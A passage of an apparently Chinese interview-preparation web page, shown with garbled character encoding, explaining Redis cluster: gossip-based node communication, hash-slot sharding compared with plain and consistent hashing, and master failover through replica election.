id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>åœ¨å‰å‡ å¹´ï¼Œredis å¦‚æœè¦æå‡ ä¸ªèŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹å­˜å‚¨ä¸€éƒ¨åˆ†çš„æ•°æ®ï¼Œå¾—<strong>å€ŸåŠ©ä¸€äº›ä¸­é—´ä»¶</strong>æ¥å®ç°ï¼Œæ¯”å¦‚è¯´æœ‰ <code>codis</code>ï¼Œæˆ–è€… <code>twemproxy</code>ï¼Œéƒ½æœ‰ã€‚æœ‰ä¸€äº› redis ä¸­é—´ä»¶ï¼Œä½ è¯»å†™ redis ä¸­é—´ä»¶ï¼Œredis ä¸­é—´ä»¶è´Ÿè´£å°†ä½ çš„æ•°æ®åˆ†å¸ƒå¼å­˜å‚¨åœ¨å¤šå°æœºå™¨ä¸Šçš„ redis å®ä¾‹ä¸­ã€‚</p><p>è¿™ä¸¤å¹´ï¼Œredis ä¸æ–­åœ¨å‘å±•ï¼Œredis ä¹Ÿä¸æ–­æœ‰æ–°çš„ç‰ˆæœ¬ï¼Œç°åœ¨çš„ redis é›†ç¾¤æ¨¡å¼ï¼Œå¯ä»¥åšåˆ°åœ¨å¤šå°æœºå™¨ä¸Šï¼Œéƒ¨ç½²å¤šä¸ª redis å®ä¾‹ï¼Œæ¯ä¸ªå®ä¾‹å­˜å‚¨ä¸€éƒ¨åˆ†çš„æ•°æ®ï¼ŒåŒæ—¶æ¯ä¸ª redis ä¸»å®ä¾‹å¯ä»¥æŒ‚ redis ä»å®ä¾‹ï¼Œè‡ªåŠ¨ç¡®ä¿è¯´ï¼Œå¦‚æœ redis ä¸»å®ä¾‹æŒ‚äº†ï¼Œä¼šè‡ªåŠ¨åˆ‡æ¢åˆ° redis ä»å®ä¾‹ä¸Šæ¥ã€‚</p><p>ç°åœ¨ redis çš„æ–°ç‰ˆæœ¬ï¼Œå¤§å®¶éƒ½æ˜¯ç”¨ redis cluster çš„ï¼Œä¹Ÿå°±æ˜¯ redis åŸç”Ÿæ”¯æŒçš„ redis é›†ç¾¤æ¨¡å¼ï¼Œé‚£ä¹ˆé¢è¯•å®˜è‚¯å®šä¼šå°± redis cluster å¯¹ä½ æ¥ä¸ªå‡ è¿ç‚®ã€‚è¦æ˜¯ä½ æ²¡ç”¨è¿‡ redis clusterï¼Œæ­£å¸¸ï¼Œä»¥å‰å¾ˆå¤šäººç”¨ codis ä¹‹ç±»çš„å®¢æˆ·ç«¯æ¥æ”¯æŒé›†ç¾¤ï¼Œä½†æ˜¯èµ·ç ä½ å¾—ç ”ç©¶ä¸€ä¸‹ redis cluster å§ã€‚</p><p>å¦‚æœä½ çš„æ•°æ®é‡å¾ˆå°‘ï¼Œä¸»è¦æ˜¯æ‰¿è½½é«˜å¹¶å‘é«˜æ€§èƒ½çš„åœºæ™¯ï¼Œæ¯”å¦‚ä½ çš„ç¼“å­˜ä¸€èˆ¬å°±å‡ ä¸ª Gï¼Œå•æœºå°±è¶³å¤Ÿäº†ï¼Œå¯ä»¥ä½¿ç”¨ replicationï¼Œä¸€ä¸ª master å¤šä¸ª slavesï¼Œè¦å‡ ä¸ª slave è·Ÿä½ è¦æ±‚çš„è¯»ååé‡æœ‰å…³ï¼Œç„¶åè‡ªå·±æ­å»ºä¸€ä¸ª sentinel é›†ç¾¤å»ä¿è¯ redis ä¸»ä»æ¶æ„çš„é«˜å¯ç”¨æ€§ã€‚</p><p>redis clusterï¼Œä¸»è¦æ˜¯é’ˆå¯¹<strong>æµ·é‡æ•°æ®+é«˜å¹¶å‘+é«˜å¯ç”¨</strong>çš„åœºæ™¯ã€‚redis cluster æ”¯æ’‘ N ä¸ª redis master nodeï¼Œæ¯ä¸ª master node éƒ½å¯ä»¥æŒ‚è½½å¤šä¸ª slave nodeã€‚è¿™æ ·æ•´ä¸ª redis å°±å¯ä»¥æ¨ªå‘æ‰©å®¹äº†ã€‚å¦‚æœä½ è¦æ”¯æ’‘æ›´å¤§æ•°æ®é‡çš„ç¼“å­˜ï¼Œé‚£å°±æ¨ªå‘æ‰©å®¹æ›´å¤šçš„ master èŠ‚ç‚¹ï¼Œæ¯ä¸ª master èŠ‚ç‚¹å°±èƒ½å­˜æ”¾æ›´å¤šçš„æ•°æ®äº†ã€‚</p><h2><span id="é¢è¯•é¢˜å‰–æ">é¢è¯•é¢˜å‰–æ</span></h2><h3><span id="redis-cluster-ä»‹ç»">redis cluster ä»‹ç»</span></h3><ul><li>è‡ªåŠ¨å°†æ•°æ®è¿›è¡Œåˆ†ç‰‡ï¼Œæ¯ä¸ª master ä¸Šæ”¾ä¸€éƒ¨åˆ†æ•°æ®</li><li>æä¾›å†…ç½®çš„é«˜å¯ç”¨æ”¯æŒï¼Œéƒ¨åˆ† master ä¸å¯ç”¨æ—¶ï¼Œè¿˜æ˜¯å¯ä»¥ç»§ç»­å·¥ä½œçš„</li></ul><p>åœ¨ redis cluster æ¶æ„ä¸‹ï¼Œæ¯ä¸ª redis è¦æ”¾å¼€ä¸¤ä¸ªç«¯å£å·ï¼Œæ¯”å¦‚ä¸€ä¸ªæ˜¯ 6379ï¼Œå¦å¤–ä¸€ä¸ªå°±æ˜¯ åŠ 1w çš„ç«¯å£å·ï¼Œæ¯”å¦‚ 16379ã€‚</p><p>16379 ç«¯å£å·æ˜¯ç”¨æ¥è¿›è¡ŒèŠ‚ç‚¹é—´é€šä¿¡çš„ï¼Œä¹Ÿå°±æ˜¯ cluster bus çš„ä¸œè¥¿ï¼Œcluster bus çš„é€šä¿¡ï¼Œç”¨æ¥è¿›è¡Œæ•…éšœæ£€æµ‹ã€é…ç½®æ›´æ–°ã€æ•…éšœè½¬ç§»æˆæƒã€‚cluster bus ç”¨äº†å¦å¤–ä¸€ç§äºŒè¿›åˆ¶çš„åè®®ï¼Œ<code>gossip</code> åè®®ï¼Œç”¨äºèŠ‚ç‚¹é—´è¿›è¡Œé«˜æ•ˆçš„æ•°æ®äº¤æ¢ï¼Œå ç”¨æ›´å°‘çš„ç½‘ç»œå¸¦å®½å’Œå¤„ç†æ—¶é—´ã€‚</p><h3><span id="èŠ‚ç‚¹é—´çš„å†…éƒ¨é€šä¿¡æœºåˆ¶">èŠ‚ç‚¹é—´çš„å†…éƒ¨é€šä¿¡æœºåˆ¶</span></h3><h4><span id="åŸºæœ¬é€šä¿¡åŸç†">åŸºæœ¬é€šä¿¡åŸç†</span></h4><p>é›†ç¾¤å…ƒæ•°æ®çš„ç»´æŠ¤æœ‰ä¸¤ç§æ–¹å¼ï¼šé›†ä¸­å¼ã€Gossip åè®®ã€‚redis cluster èŠ‚ç‚¹é—´é‡‡ç”¨ gossip åè®®è¿›è¡Œé€šä¿¡ã€‚</p><p><strong>é›†ä¸­å¼</strong>æ˜¯å°†é›†ç¾¤å…ƒæ•°æ®ï¼ˆèŠ‚ç‚¹ä¿¡æ¯ã€æ•…éšœç­‰ç­‰ï¼‰å‡ ç§å­˜å‚¨åœ¨æŸä¸ªèŠ‚ç‚¹ä¸Šã€‚é›†ä¸­å¼å…ƒæ•°æ®é›†ä¸­å­˜å‚¨çš„ä¸€ä¸ªå…¸å‹ä»£è¡¨ï¼Œå°±æ˜¯å¤§æ•°æ®é¢†åŸŸçš„ <code>storm</code>ã€‚å®ƒæ˜¯åˆ†å¸ƒå¼çš„å¤§æ•°æ®å®æ—¶è®¡ç®—å¼•æ“ï¼Œæ˜¯é›†ä¸­å¼çš„å…ƒæ•°æ®å­˜å‚¨çš„ç»“æ„ï¼Œåº•å±‚åŸºäº zookeeperï¼ˆåˆ†å¸ƒå¼åè°ƒçš„ä¸­é—´ä»¶ï¼‰å¯¹æ‰€æœ‰å…ƒæ•°æ®è¿›è¡Œå­˜å‚¨ç»´æŠ¤ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/zookeeper-centralized-storage.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/zookeeper-centralized-storage.png" alt="zookeeper-centralized-storage"></a></p><p>redis ç»´æŠ¤é›†ç¾¤å…ƒæ•°æ®é‡‡ç”¨å¦ä¸€ä¸ªæ–¹å¼ï¼Œ <code>gossip</code> åè®®ï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½æŒæœ‰ä¸€ä»½å…ƒæ•°æ®ï¼Œä¸åŒçš„èŠ‚ç‚¹å¦‚æœå‡ºç°äº†å…ƒæ•°æ®çš„å˜æ›´ï¼Œå°±ä¸æ–­å°†å…ƒæ•°æ®å‘é€ç»™å…¶å®ƒçš„èŠ‚ç‚¹ï¼Œè®©å…¶å®ƒèŠ‚ç‚¹ä¹Ÿè¿›è¡Œå…ƒæ•°æ®çš„å˜æ›´ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/redis-gossip.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/redis-gossip.png" alt="redis-gossip"></a></p><p><strong>é›†ä¸­å¼</strong>çš„<strong>å¥½å¤„</strong>åœ¨äºï¼Œå…ƒæ•°æ®çš„è¯»å–å’Œæ›´æ–°ï¼Œæ—¶æ•ˆæ€§éå¸¸å¥½ï¼Œä¸€æ—¦å…ƒæ•°æ®å‡ºç°äº†å˜æ›´ï¼Œå°±ç«‹å³æ›´æ–°åˆ°é›†ä¸­å¼çš„å­˜å‚¨ä¸­ï¼Œå…¶å®ƒèŠ‚ç‚¹è¯»å–çš„æ—¶å€™å°±å¯ä»¥æ„ŸçŸ¥åˆ°ï¼›<strong>ä¸å¥½</strong>åœ¨äºï¼Œæ‰€æœ‰çš„å…ƒæ•°æ®çš„æ›´æ–°å‹åŠ›å…¨éƒ¨é›†ä¸­åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œå¯èƒ½ä¼šå¯¼è‡´å…ƒæ•°æ®çš„å­˜å‚¨æœ‰å‹åŠ›ã€‚</p><p>gossip å¥½å¤„åœ¨äºï¼Œå…ƒæ•°æ®çš„æ›´æ–°æ¯”è¾ƒåˆ†æ•£ï¼Œä¸æ˜¯é›†ä¸­åœ¨ä¸€ä¸ªåœ°æ–¹ï¼Œæ›´æ–°è¯·æ±‚ä¼šé™†é™†ç»­ç»­æ‰“åˆ°æ‰€æœ‰èŠ‚ç‚¹ä¸Šå»æ›´æ–°ï¼Œé™ä½äº†å‹åŠ›ï¼›ä¸å¥½åœ¨äºï¼Œå…ƒæ•°æ®çš„æ›´æ–°æœ‰å»¶æ—¶ï¼Œå¯èƒ½å¯¼è‡´é›†ç¾¤ä¸­çš„ä¸€äº›æ“ä½œä¼šæœ‰ä¸€äº›æ»åã€‚</p><ul><li>10000 ç«¯å£ï¼šæ¯ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸€ä¸ªä¸“é—¨ç”¨äºèŠ‚ç‚¹é—´é€šä¿¡çš„ç«¯å£ï¼Œå°±æ˜¯è‡ªå·±æä¾›æœåŠ¡çš„ç«¯å£å·+10000ï¼Œæ¯”å¦‚ 7001ï¼Œé‚£ä¹ˆç”¨äºèŠ‚ç‚¹é—´é€šä¿¡çš„å°±æ˜¯ 17001 ç«¯å£ã€‚æ¯ä¸ªèŠ‚ç‚¹æ¯éš”ä¸€æ®µæ—¶é—´éƒ½ä¼šå¾€å¦å¤–å‡ ä¸ªèŠ‚ç‚¹å‘é€ <code>ping</code> æ¶ˆæ¯ï¼ŒåŒæ—¶å…¶å®ƒå‡ ä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ° <code>ping</code> ä¹‹åè¿”å› <code>pong</code>ã€‚</li><li>äº¤æ¢çš„ä¿¡æ¯ï¼šä¿¡æ¯åŒ…æ‹¬æ•…éšœä¿¡æ¯ï¼ŒèŠ‚ç‚¹çš„å¢åŠ å’Œåˆ é™¤ï¼Œhash slot ä¿¡æ¯ç­‰ç­‰ã€‚</li></ul><h4><span id="gossip-åè®®">gossip åè®®</span></h4><p>gossip åè®®åŒ…å«å¤šç§æ¶ˆæ¯ï¼ŒåŒ…å« <code>ping</code>,<code>pong</code>,<code>meet</code>,<code>fail</code> ç­‰ç­‰ã€‚</p><ul><li>meetï¼šæŸä¸ªèŠ‚ç‚¹å‘é€ meet ç»™æ–°åŠ å…¥çš„èŠ‚ç‚¹ï¼Œè®©æ–°èŠ‚ç‚¹åŠ å…¥é›†ç¾¤ä¸­ï¼Œç„¶åæ–°èŠ‚ç‚¹å°±ä¼šå¼€å§‹ä¸å…¶å®ƒèŠ‚ç‚¹è¿›è¡Œé€šä¿¡ã€‚</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-trib.rb add-node</span><br></pre></td></tr></table></figure><p>å…¶å®å†…éƒ¨å°±æ˜¯å‘é€äº†ä¸€ä¸ª gossip meet æ¶ˆæ¯ç»™æ–°åŠ å…¥çš„èŠ‚ç‚¹ï¼Œé€šçŸ¥é‚£ä¸ªèŠ‚ç‚¹å»åŠ å…¥æˆ‘ä»¬çš„é›†ç¾¤ã€‚</p><ul><li>pingï¼šæ¯ä¸ªèŠ‚ç‚¹éƒ½ä¼šé¢‘ç¹ç»™å…¶å®ƒèŠ‚ç‚¹å‘é€ pingï¼Œå…¶ä¸­åŒ…å«è‡ªå·±çš„çŠ¶æ€è¿˜æœ‰è‡ªå·±ç»´æŠ¤çš„é›†ç¾¤å…ƒæ•°æ®ï¼Œäº’ç›¸é€šè¿‡ ping äº¤æ¢å…ƒæ•°æ®ã€‚</li><li>pongï¼šè¿”å› ping å’Œ meeetï¼ŒåŒ…å«è‡ªå·±çš„çŠ¶æ€å’Œå…¶å®ƒä¿¡æ¯ï¼Œä¹Ÿç”¨äºä¿¡æ¯å¹¿æ’­å’Œæ›´æ–°ã€‚</li><li>failï¼šæŸä¸ªèŠ‚ç‚¹åˆ¤æ–­å¦ä¸€ä¸ªèŠ‚ç‚¹ fail ä¹‹åï¼Œå°±å‘é€ fail ç»™å…¶å®ƒèŠ‚ç‚¹ï¼Œé€šçŸ¥å…¶å®ƒèŠ‚ç‚¹è¯´ï¼ŒæŸä¸ªèŠ‚ç‚¹å®•æœºå•¦ã€‚</li></ul><h4><span id="ping-æ¶ˆæ¯æ·±å…¥">ping æ¶ˆæ¯æ·±å…¥</span></h4><p>ping æ—¶è¦æºå¸¦ä¸€äº›å…ƒæ•°æ®ï¼Œå¦‚æœå¾ˆé¢‘ç¹ï¼Œå¯èƒ½ä¼šåŠ é‡ç½‘ç»œè´Ÿæ‹…ã€‚</p><p>æ¯ä¸ªèŠ‚ç‚¹æ¯ç§’ä¼šæ‰§è¡Œ 10 æ¬¡ pingï¼Œæ¯æ¬¡ä¼šé€‰æ‹© 5 ä¸ªæœ€ä¹…æ²¡æœ‰é€šä¿¡çš„å…¶å®ƒèŠ‚ç‚¹ã€‚å½“ç„¶å¦‚æœå‘ç°æŸä¸ªèŠ‚ç‚¹é€šä¿¡å»¶æ—¶è¾¾åˆ°äº† <code>cluster_node_timeout / 2</code>ï¼Œé‚£ä¹ˆç«‹å³å‘é€ pingï¼Œé¿å…æ•°æ®äº¤æ¢å»¶æ—¶è¿‡é•¿ï¼Œè½åçš„æ—¶é—´å¤ªé•¿äº†ã€‚æ¯”å¦‚è¯´ï¼Œä¸¤ä¸ªèŠ‚ç‚¹ä¹‹é—´éƒ½ 10 åˆ†é’Ÿæ²¡æœ‰äº¤æ¢æ•°æ®äº†ï¼Œé‚£ä¹ˆæ•´ä¸ªé›†ç¾¤å¤„äºä¸¥é‡çš„å…ƒæ•°æ®ä¸ä¸€è‡´çš„æƒ…å†µï¼Œå°±ä¼šæœ‰é—®é¢˜ã€‚æ‰€ä»¥ <code>cluster_node_timeout</code> å¯ä»¥è°ƒèŠ‚ï¼Œå¦‚æœè°ƒå¾—æ¯”è¾ƒå¤§ï¼Œé‚£ä¹ˆä¼šé™ä½ ping çš„é¢‘ç‡ã€‚</p><p>æ¯æ¬¡ pingï¼Œä¼šå¸¦ä¸Šè‡ªå·±èŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œè¿˜æœ‰å°±æ˜¯å¸¦ä¸Š 1&#x2F;10 å…¶å®ƒèŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œå‘é€å‡ºå»ï¼Œè¿›è¡Œäº¤æ¢ã€‚è‡³å°‘åŒ…å« <code>3</code> ä¸ªå…¶å®ƒèŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œæœ€å¤šåŒ…å« <code>æ€»èŠ‚ç‚¹æ•°å‡ 2</code> ä¸ªå…¶å®ƒèŠ‚ç‚¹çš„ä¿¡æ¯ã€‚</p><h3><span id="åˆ†å¸ƒå¼å¯»å€ç®—æ³•">åˆ†å¸ƒå¼å¯»å€ç®—æ³•</span></h3><ul><li>hash ç®—æ³•ï¼ˆå¤§é‡ç¼“å­˜é‡å»ºï¼‰</li><li>ä¸€è‡´æ€§ hash ç®—æ³•ï¼ˆè‡ªåŠ¨ç¼“å­˜è¿ç§»ï¼‰+ è™šæ‹ŸèŠ‚ç‚¹ï¼ˆè‡ªåŠ¨è´Ÿè½½å‡è¡¡ï¼‰</li><li>redis cluster çš„ hash slot ç®—æ³•</li></ul><h4><span id="hash-ç®—æ³•">hash ç®—æ³•</span></h4><p>æ¥äº†ä¸€ä¸ª keyï¼Œé¦–å…ˆè®¡ç®— hash å€¼ï¼Œç„¶åå¯¹èŠ‚ç‚¹æ•°å–æ¨¡ã€‚ç„¶åæ‰“åœ¨ä¸åŒçš„ master èŠ‚ç‚¹ä¸Šã€‚ä¸€æ—¦æŸä¸€ä¸ª master èŠ‚ç‚¹å®•æœºï¼Œæ‰€æœ‰è¯·æ±‚è¿‡æ¥ï¼Œéƒ½ä¼šåŸºäºæœ€æ–°çš„å‰©ä½™ master èŠ‚ç‚¹æ•°å»å–æ¨¡ï¼Œå°è¯•å»å–æ•°æ®ã€‚è¿™ä¼šå¯¼è‡´<strong>å¤§éƒ¨åˆ†çš„è¯·æ±‚è¿‡æ¥ï¼Œå…¨éƒ¨æ— æ³•æ‹¿åˆ°æœ‰æ•ˆçš„ç¼“å­˜</strong>ï¼Œå¯¼è‡´å¤§é‡çš„æµé‡æ¶Œå…¥æ•°æ®åº“ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/hash.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/hash.png" alt="hash"></a></p><h4><span id="ä¸€è‡´æ€§-hash-ç®—æ³•">ä¸€è‡´æ€§ hash ç®—æ³•</span></h4><p>ä¸€è‡´æ€§ hash ç®—æ³•å°†æ•´ä¸ª hash å€¼ç©ºé—´ç»„ç»‡æˆä¸€ä¸ªè™šæ‹Ÿçš„åœ†ç¯ï¼Œæ•´ä¸ªç©ºé—´æŒ‰é¡ºæ—¶é’ˆæ–¹å‘ç»„ç»‡ï¼Œä¸‹ä¸€æ­¥å°†å„ä¸ª master èŠ‚ç‚¹ï¼ˆä½¿ç”¨æœåŠ¡å™¨çš„ ip æˆ–ä¸»æœºåï¼‰è¿›è¡Œ hashã€‚è¿™æ ·å°±èƒ½ç¡®å®šæ¯ä¸ªèŠ‚ç‚¹åœ¨å…¶å“ˆå¸Œç¯ä¸Šçš„ä½ç½®ã€‚</p><p>æ¥äº†ä¸€ä¸ª keyï¼Œé¦–å…ˆè®¡ç®— hash å€¼ï¼Œå¹¶ç¡®å®šæ­¤æ•°æ®åœ¨ç¯ä¸Šçš„ä½ç½®ï¼Œä»æ­¤ä½ç½®æ²¿ç¯<strong>é¡ºæ—¶é’ˆâ€œè¡Œèµ°â€</strong>ï¼Œé‡åˆ°çš„ç¬¬ä¸€ä¸ª master èŠ‚ç‚¹å°±æ˜¯ key æ‰€åœ¨ä½ç½®ã€‚</p><p>åœ¨ä¸€è‡´æ€§å“ˆå¸Œç®—æ³•ä¸­ï¼Œå¦‚æœä¸€ä¸ªèŠ‚ç‚¹æŒ‚äº†ï¼Œå—å½±å“çš„æ•°æ®ä»…ä»…æ˜¯æ­¤èŠ‚ç‚¹åˆ°ç¯ç©ºé—´å‰ä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ²¿ç€é€†æ—¶é’ˆæ–¹å‘è¡Œèµ°é‡åˆ°çš„ç¬¬ä¸€ä¸ªèŠ‚ç‚¹ï¼‰ä¹‹é—´çš„æ•°æ®ï¼Œå…¶å®ƒä¸å—å½±å“ã€‚å¢åŠ ä¸€ä¸ªèŠ‚ç‚¹ä¹ŸåŒç†ã€‚</p><p>ç‡ƒé¹…ï¼Œä¸€è‡´æ€§å“ˆå¸Œç®—æ³•åœ¨èŠ‚ç‚¹å¤ªå°‘æ—¶ï¼Œå®¹æ˜“å› ä¸ºèŠ‚ç‚¹åˆ†å¸ƒä¸å‡åŒ€è€Œé€ æˆ<strong>ç¼“å­˜çƒ­ç‚¹</strong>çš„é—®é¢˜ã€‚ä¸ºäº†è§£å†³è¿™ç§çƒ­ç‚¹é—®é¢˜ï¼Œä¸€è‡´æ€§ hash ç®—æ³•å¼•å…¥äº†è™šæ‹ŸèŠ‚ç‚¹æœºåˆ¶ï¼Œå³å¯¹æ¯ä¸€ä¸ªèŠ‚ç‚¹è®¡ç®—å¤šä¸ª hashï¼Œæ¯ä¸ªè®¡ç®—ç»“æœä½ç½®éƒ½æ”¾ç½®ä¸€ä¸ªè™šæ‹ŸèŠ‚ç‚¹ã€‚è¿™æ ·å°±å®ç°äº†æ•°æ®çš„å‡åŒ€åˆ†å¸ƒï¼Œè´Ÿè½½å‡è¡¡ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/consistent-hashing-algorithm.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/consistent-hashing-algorithm.png" alt="consistent-hashing-algorithm"></a></p><h4><span id="redis-cluster-çš„-hash-slot-ç®—æ³•">redis cluster çš„ hash slot ç®—æ³•</span></h4><p>redis cluster æœ‰å›ºå®šçš„ <code>16384</code> ä¸ª hash slotï¼Œå¯¹æ¯ä¸ª <code>key</code> è®¡ç®— <code>CRC16</code> å€¼ï¼Œç„¶åå¯¹ <code>16384</code> å–æ¨¡ï¼Œå¯ä»¥è·å– key å¯¹åº”çš„ hash slotã€‚</p><p>redis cluster ä¸­æ¯ä¸ª master éƒ½ä¼šæŒæœ‰éƒ¨åˆ† slotï¼Œæ¯”å¦‚æœ‰ 3 ä¸ª masterï¼Œé‚£ä¹ˆå¯èƒ½æ¯ä¸ª master æŒæœ‰ 5000 å¤šä¸ª hash slotã€‚hash slot è®© node çš„å¢åŠ å’Œç§»é™¤å¾ˆç®€å•ï¼Œå¢åŠ ä¸€ä¸ª masterï¼Œå°±å°†å…¶ä»– master çš„ hash slot ç§»åŠ¨éƒ¨åˆ†è¿‡å»ï¼Œå‡å°‘ä¸€ä¸ª masterï¼Œå°±å°†å®ƒçš„ hash slot ç§»åŠ¨åˆ°å…¶ä»– master ä¸Šå»ã€‚ç§»åŠ¨ hash slot çš„æˆæœ¬æ˜¯éå¸¸ä½çš„ã€‚å®¢æˆ·ç«¯çš„ apiï¼Œå¯ä»¥å¯¹æŒ‡å®šçš„æ•°æ®ï¼Œè®©ä»–ä»¬èµ°åŒä¸€ä¸ª hash slotï¼Œé€šè¿‡ <code>hash tag</code> æ¥å®ç°ã€‚</p><p>ä»»ä½•ä¸€å°æœºå™¨å®•æœºï¼Œå¦å¤–ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œä¸å½±å“çš„ã€‚å› ä¸º key æ‰¾çš„æ˜¯ hash slotï¼Œä¸æ˜¯æœºå™¨ã€‚</p><p><a href="https://github.com/Disda-coding/advanced-java/blob/master/images/hash-slot.png"><img src="https://github.com/Disda-coding/advanced-java/raw/master/images/hash-slot.png" alt="hash-slot"></a></p><h3><span id="redis-cluster-çš„é«˜å¯ç”¨ä¸ä¸»å¤‡åˆ‡æ¢åŸç†">redis cluster çš„é«˜å¯ç”¨ä¸ä¸»å¤‡åˆ‡æ¢åŸç†</span></h3><p>redis cluster çš„é«˜å¯ç”¨çš„åŸç†ï¼Œå‡ ä¹è·Ÿå“¨å…µæ˜¯ç±»ä¼¼çš„ã€‚</p><h4><span id="åˆ¤æ–­èŠ‚ç‚¹å®•æœº">åˆ¤æ–­èŠ‚ç‚¹å®•æœº</span></h4><p>å¦‚æœä¸€ä¸ªèŠ‚ç‚¹è®¤ä¸ºå¦å¤–ä¸€ä¸ªèŠ‚ç‚¹å®•æœºï¼Œé‚£ä¹ˆå°±æ˜¯ <code>pfail</code>ï¼Œ<strong>ä¸»è§‚å®•æœº</strong>ã€‚å¦‚æœå¤šä¸ªèŠ‚ç‚¹éƒ½è®¤ä¸ºå¦å¤–ä¸€ä¸ªèŠ‚ç‚¹å®•æœºäº†ï¼Œé‚£ä¹ˆå°±æ˜¯ <code>fail</code>ï¼Œ<strong>å®¢è§‚å®•æœº</strong>ï¼Œè·Ÿå“¨å…µçš„åŸç†å‡ ä¹ä¸€æ ·ï¼Œsdownï¼Œodownã€‚</p><p>åœ¨ <code>cluster-node-timeout</code> å†…ï¼ŒæŸä¸ªèŠ‚ç‚¹ä¸€ç›´æ²¡æœ‰è¿”å› <code>pong</code>ï¼Œé‚£ä¹ˆå°±è¢«è®¤ä¸º <code>pfail</code>ã€‚</p><p>å¦‚æœä¸€ä¸ªèŠ‚ç‚¹è®¤ä¸ºæŸä¸ªèŠ‚ç‚¹ <code>pfail</code> äº†ï¼Œé‚£ä¹ˆä¼šåœ¨ <code>gossip ping</code> æ¶ˆæ¯ä¸­ï¼Œ<code>ping</code> ç»™å…¶ä»–èŠ‚ç‚¹ï¼Œå¦‚æœ<strong>è¶…è¿‡åŠæ•°</strong>çš„èŠ‚ç‚¹éƒ½è®¤ä¸º <code>pfail</code> äº†ï¼Œé‚£ä¹ˆå°±ä¼šå˜æˆ <code>fail</code>ã€‚</p><h4><span id="ä»èŠ‚ç‚¹è¿‡æ»¤">ä»èŠ‚ç‚¹è¿‡æ»¤</span></h4><p>å¯¹å®•æœºçš„ master nodeï¼Œä»å…¶æ‰€æœ‰çš„ slave node ä¸­ï¼Œé€‰æ‹©ä¸€ä¸ªåˆ‡æ¢æˆ master nodeã€‚</p><p>æ£€æŸ¥æ¯ä¸ª slave node ä¸ master node æ–­å¼€è¿æ¥çš„æ—¶é—´ï¼Œå¦‚æœè¶…è¿‡äº† <code>cluster-node-timeout * cluster-slave-validity-factor</code>ï¼Œé‚£ä¹ˆå°±<strong>æ²¡æœ‰èµ„æ ¼</strong>åˆ‡æ¢æˆ <code>master</code>ã€‚</p><h4><span id="ä»èŠ‚ç‚¹é€‰ä¸¾">ä»èŠ‚ç‚¹é€‰ä¸¾</span></h4><p>æ¯ä¸ªä»èŠ‚ç‚¹ï¼Œéƒ½æ ¹æ®è‡ªå·±å¯¹ master å¤åˆ¶æ•°æ®çš„ offsetï¼Œæ¥è®¾ç½®ä¸€ä¸ªé€‰ä¸¾æ—¶é—´ï¼Œoffset è¶Šå¤§ï¼ˆå¤åˆ¶æ•°æ®è¶Šå¤šï¼‰çš„ä»èŠ‚ç‚¹ï¼Œé€‰ä¸¾æ—¶é—´è¶Šé å‰ï¼Œä¼˜å…ˆè¿›è¡Œé€‰ä¸¾ã€‚</p><p>æ‰€æœ‰çš„ master node å¼€å§‹ slave é€‰ä¸¾æŠ•ç¥¨ï¼Œç»™è¦è¿›è¡Œé€‰ä¸¾çš„ slave è¿›è¡ŒæŠ•ç¥¨ï¼Œå¦‚æœå¤§éƒ¨åˆ† master node<code>ï¼ˆN/2 + 1ï¼‰</code>éƒ½æŠ•ç¥¨ç»™äº†æŸä¸ªä»èŠ‚ç‚¹ï¼Œé‚£ä¹ˆé€‰ä¸¾é€šè¿‡ï¼Œé‚£ä¸ªä»èŠ‚ç‚¹å¯ä»¥åˆ‡æ¢æˆ masterã€‚</p><p>ä»èŠ‚ç‚¹æ‰§è¡Œä¸»å¤‡åˆ‡æ¢ï¼Œä»èŠ‚ç‚¹åˆ‡æ¢ä¸ºä¸»èŠ‚ç‚¹ã€‚</p><h4><span id="ä¸å“¨å…µæ¯”è¾ƒ">ä¸å“¨å…µæ¯”è¾ƒ</span></h4><p>æ•´ä¸ªæµç¨‹è·Ÿå“¨å…µç›¸æ¯”ï¼Œéå¸¸ç±»ä¼¼ï¼Œæ‰€ä»¥è¯´ï¼Œredis cluster åŠŸèƒ½å¼ºå¤§ï¼Œç›´æ¥é›†æˆäº† replication å’Œ sentinel çš„åŠŸèƒ½ã€‚</p><h1><span id="ç”Ÿäº§ç¯å¢ƒä¸­çš„-redis-æ˜¯æ€ä¹ˆéƒ¨ç½²çš„">ç”Ÿäº§ç¯å¢ƒä¸­çš„ redis æ˜¯æ€ä¹ˆéƒ¨ç½²çš„ï¼Ÿ</span></h1><h2><span id="é¢è¯•å®˜å¿ƒç†åˆ†æ">é¢è¯•å®˜å¿ƒç†åˆ†æ</span></h2><p>çœ‹çœ‹ä½ äº†è§£ä¸äº†è§£ä½ ä»¬å…¬å¸çš„ redis ç”Ÿäº§é›†ç¾¤çš„éƒ¨ç½²æ¶æ„ï¼Œå¦‚æœä½ ä¸äº†è§£ï¼Œé‚£ä¹ˆç¡®å®ä½ å°±å¾ˆå¤±èŒäº†ï¼Œä½ çš„ redis 